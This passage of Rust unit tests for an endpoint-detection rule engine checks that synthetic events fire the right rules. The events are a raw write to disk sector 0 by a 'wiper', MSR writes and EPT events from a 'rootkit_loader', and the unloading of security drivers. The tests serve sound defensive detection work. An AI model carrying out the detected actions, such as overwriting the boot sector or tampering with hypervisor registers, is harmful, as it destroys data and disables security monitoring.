        assert_eq!(mbr_hits.len(), 1);
        assert_eq!(mbr_hits[0].rule_id, "MBR-001");
        assert_eq!(mbr_hits[0].rule_name, "EDR.Ransomware.MbrSector0RawWrite");
        assert_eq!(mbr_hits[0].severity, RuleSeverity::Critical);

        let disk_raw_sec0 = sample_event(
            "LLE_DISK_RAW_WRITE_ACCESS",
            r"C:\Temp\wiper.exe",
            None,
            json!({ "path": r"\\.\PhysicalDrive0", "sector": 0 }),
        );
        assert_eq!(evaluate_event(&disk_raw_sec0).len(), 1);
        assert_eq!(evaluate_event(&disk_raw_sec0)[0].rule_id, "MBR-001");

        let disk_raw_benign = sample_event(
            "LLE_DISK_RAW_WRITE_ACCESS",
            r"C:\Windows\System32\defrag.exe",
            None,
            json!({ "path": r"\\.\PhysicalDrive0", "sector": 2048 }),
        );
        assert!(evaluate_event(&disk_raw_benign).is_empty());

        let hv_wrmsr = sample_event(
            "LLE_DEVICE_IOCTL",
            r"C:\Temp\rootkit_loader.exe",
            None,
            json!({
                "owlyHook": { "eventType": 65, "apiFunction": "WRMSR" },
                "owlyHv": { "timestamp": 133800000000000000u64, "context": 3221225602u64 }
            }),
        );
        let hv_hits = evaluate_event(&hv_wrmsr);
        assert_eq!(hv_hits.len(), 1);
        assert_eq!(hv_hits[0].rule_id, "HV-001");
        assert_eq!(hv_hits[0].severity, RuleSeverity::Critical);

        let mut hv_sys = sample_event(
            "LLE_DEVICE_IOCTL",
            "System",
            None,
            json!({
                "owlyHook": { "eventType": 65, "apiFunction": "WRMSR" },
                "owlyHv": { "timestamp": 133800000000000000u64, "context": 3221225602u64 }
            }),
        );
        hv_sys.pid = 4;
        assert!(evaluate_event(&hv_sys).is_empty());

        let hv_mle = sample_event(
            "MLE_HYPERVISOR_MSR_TAMPER",
            r"C:\Temp\rootkit_loader.exe",
            None,
            json!({ "targetMsr": 0xC0000080u64 }),
        );
        assert_eq!(evaluate_event(&hv_mle).len(), 1);
        assert_eq!(evaluate_event(&hv_mle)[0].rule_id, "HV-001");

        let hv_ept = sample_event(
            "LLE_DEVICE_IOCTL",
            r"C:\Temp\injector.exe",
            None,
            json!({
                "owlyHook": { "eventType": 0x10 },
                "owlyHv": { "timestamp": 133800000000000000u64, "context": 7u64, "memoryAddress": 0x1000u64 }
            }),
        );
        let ept_hits = evaluate_event(&hv_ept);
        assert_eq!(ept_hits.len(), 1);
        assert_eq!(ept_hits[0].rule_id, "HV-002");
        assert_eq!(ept_hits[0].severity, RuleSeverity::High);

        for drv in ["MBRFilter.sys", "hyperhv.sys", "RedDbgDrv.sys"] {
            let unload_ev = sample_event(
                "DRIVER_UNLOADED",
                "services.exe",
                None,
                json!({ "driver_path": format!(r"C:\Windows\System32\drivers\{drv}") }),
            );
            let dhits = evaluate_event(&unload_ev);
            assert_eq!(dhits.len(), 1, "expected tamper hit for {drv}");
            assert_eq!(dhits[0].rule_id, "DRV-002");
        }
    }
}
